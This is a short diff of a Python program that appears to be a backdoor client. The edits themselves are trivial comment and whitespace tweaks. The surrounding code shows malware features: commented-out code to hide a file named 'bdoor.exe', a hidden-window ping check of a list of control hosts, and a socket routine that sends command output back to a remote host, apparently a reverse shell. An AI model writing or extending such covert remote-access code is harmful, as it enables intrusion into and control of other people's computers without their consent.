@@ -25,8 +25,6 @@ m_f()
 
 # def hide_file_windows(file_path):
 #     subprocess.run(['attrib', '+h', file_path])
-
-
 # hide_file_windows('bdoor.exe')
 
 
@@ -41,7 +39,7 @@ hosts = [
     "alivehost.tld"
 ]
 
-#check alive to connect
+#check the alive host
 def check_alive(host):
     try:
         result = subprocess.run(["ping", "-n", "2", host], creationflags=subprocess.CREATE_NO_WINDOW, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
@@ -88,6 +86,7 @@ def soc_connection():
             s.send(output_str)
     except Exception as e:
         pass
+        #or ....
     
 
     s.close()
